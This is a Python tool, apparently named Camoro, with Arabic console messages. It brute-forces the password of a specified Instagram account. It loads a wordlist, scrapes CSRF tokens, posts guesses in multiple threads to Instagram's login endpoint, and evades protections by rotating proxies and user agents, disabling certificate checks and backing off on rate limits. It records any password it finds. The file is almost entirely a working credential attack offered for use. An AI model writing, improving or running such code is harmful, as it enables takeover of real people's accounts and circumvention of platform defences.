#!/usr/bin/env python3
"""Camoro - Brute Force Engine"""

import json
import random
import re
import sys
import threading
import time
from datetime import datetime
from pathlib import Path
from queue import Queue

try:
    import httpx
except ImportError:
    print("[!] pip install httpx")
    sys.exit(1)

BASE_DIR = Path(__file__).parent.parent.resolve()
RESULTS_DIR = BASE_DIR / "results"

GREEN = "\033[0;32m"
RED = "\033[0;31m"
CYAN = "\033[0;36m"
YELLOW = "\033[1;33m"
WHITE = "\033[1;37m"
NC = "\033[0m"

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Instagram 330.0.0.18.85 Android (34/14; 480dpi; 1080x2400; samsung; SM-S928B; en_US)",
]


class BruteForceEngine:
    def __init__(self, username, proxy_manager=None, threads=5, rotate_every=3, delay_range=(2, 5)):
        self.username = username.strip().lstrip("@").lower()
        self.proxy_manager = proxy_manager
        self.num_threads = max(1, min(int(threads), 10))
        self.rotate_every = max(1, int(rotate_every))
        self.delay_min, self.delay_max = delay_range
        self.user_dir = RESULTS_DIR / self.username
        self.user_dir.mkdir(parents=True, exist_ok=True)

        self.passwords = self._load_passwords()
        self.tested = self._load_tested()
        self.remaining = [p for p in self.passwords if p not in self.tested]

        self.attempt_count = 0
        self.ip_rotations = 0
        self.start_time = None
        self.running = True
        self.found = False
        self.queue = Queue()
        self.lock = threading.Lock()

    def _load_passwords(self):
        path = self.user_dir / "passwords.txt"
        if not path.exists():
            print(f"{RED}[!] لا توجد كلمات مرور{NC}")
            sys.exit(1)
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip()]

    def _load_tested(self):
        path = self.user_dir / "tested.txt"
        if not path.exists():
            return set()
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return set(l.strip() for l in f if l.strip())

    def _save_tested(self, password):
        with open(self.user_dir / "tested.txt", "a", encoding="utf-8") as f:
            f.write(password + "\n")
        self.tested.add(password)

    def _save_success(self, password):
        data = {
            "username": self.username,
            "password": password,
            "attempts": self.attempt_count,
            "ip_rotations": self.ip_rotations,
            "elapsed": time.time() - self.start_time if self.start_time else 0,
            "found_at": datetime.now().isoformat(),
        }
        with open(self.user_dir / "success.txt", "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

    def _client(self):
        kwargs = {
            "headers": {
                "User-Agent": random.choice(USER_AGENTS),
                "X-IG-App-ID": "936619743392459",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://www.instagram.com",
                "Referer": "https://www.instagram.com/",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "timeout": 30.0,
            "follow_redirects": True,
            "verify": False,
        }
        if self.proxy_manager:
            proxy = self.proxy_manager.get_proxy()
            if proxy:
                kwargs["proxy"] = proxy
        try:
            kwargs["http2"] = True
        except Exception:
            pass
        return httpx.Client(**kwargs)

    def _test_password(self, client, password):
        try:
            pre = client.get("https://www.instagram.com/accounts/login/")
            csrf = ""
            m = re.search(r'csrf_token":"([^"]+)"', pre.text)
            if m:
                csrf = m.group(1)
            if not csrf:
                csrf = pre.cookies.get("csrftoken", "")
            if not csrf:
                return {"status": "connection_error"}

            ts = int(time.time())
            enc = f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}"
            data = {
                "username": self.username,
                "enc_password": enc,
                "queryParams": "{}",
                "optIntoOneTap": "false",
            }
            headers = {
                "X-CSRFToken": csrf,
                "X-Instagram-AJAX": "1",
                "X-Requested-With": "XMLHttpRequest",
            }
            r = client.post(
                "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
                data=data,
                headers=headers,
            )
            if r.status_code == 429:
                return {"status": "rate_limited"}
            if r.status_code == 403:
                return {"status": "blocked"}
            try:
                j = r.json()
            except Exception:
                return {"status": "wrong_password"}
            if j.get("authenticated") is True or j.get("user") is True:
                return {"status": "success"}
            text = str(j).lower()
            if "checkpoint" in text:
                return {"status": "checkpoint"}
            if "two_factor" in text:
                return {"status": "2fa"}
            return {"status": "wrong_password"}
        except httpx.TimeoutException:
            return {"status": "timeout"}
        except httpx.ConnectError:
            return {"status": "connection_error"}
        except Exception:
            return {"status": "error"}

    def _worker(self, _tid):
        while self.running and not self.found:
            try:
                password = self.queue.get(timeout=2)
            except Exception:
                break
            if password in self.tested:
                self.queue.task_done()
                continue

            client = self._client()
            result = self._test_password(client, password)
            try:
                client.close()
            except Exception:
                pass

            with self.lock:
                self.attempt_count += 1
                if self.proxy_manager and self.attempt_count % self.rotate_every == 0:
                    self.proxy_manager.rotate_ip()
                    self.ip_rotations += 1

                elapsed = time.time() - self.start_time if self.start_time else 1
                speed = self.attempt_count / elapsed if elapsed else 0
                print(
                    f"\r  [{self.attempt_count}/{len(self.remaining)}] "
                    f"{password[:22]:<22} | {speed:.1f}/s | IP#{self.ip_rotations}   ",
                    end="",
                    flush=True,
                )

                st = result.get("status")
                if st == "success":
                    print(f"\n\n{GREEN}[✓] PASSWORD FOUND: {password}{NC}")
                    self._save_success(password)
                    self.found = True
                    self.running = False
                elif st == "checkpoint":
                    self._save_tested(password)
                    time.sleep(30)
                elif st == "rate_limited":
                    if self.proxy_manager:
                        self.proxy_manager.rotate_ip()
                    time.sleep(random.randint(30, 90))
                elif st == "blocked":
                    self._save_tested(password)
                    if self.proxy_manager:
                        self.proxy_manager.rotate_ip()
                    time.sleep(20)
                elif st in ("timeout", "connection_error"):
                    time.sleep(5)
                else:
                    self._save_tested(password)
                    time.sleep(random.uniform(self.delay_min, self.delay_max))

            self.queue.task_done()

    def run(self):
        print(f"\n{CYAN}[*]{NC} هجوم على @{self.username}")
        print(f"  passwords left: {len(self.remaining):,}")
        print(f"  threads: {self.num_threads}")
        if not self.remaining:
            print(f"{YELLOW}[!] لا تبقى كلمات غير مختبرة{NC}")
            return False

        for p in self.remaining:
            self.queue.put(p)
        self.start_time = time.time()
        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self._worker, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{YELLOW}[!] توقف{NC}")
        return self.found


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--username", "-u", required=True)
    args = p.parse_args()

    proxy = None
    try:
        from modules.proxy_manager import ProxyManager
        proxy = ProxyManager()
    except Exception:
        pass

    eng = BruteForceEngine(args.username, proxy_manager=proxy)
    eng.run()
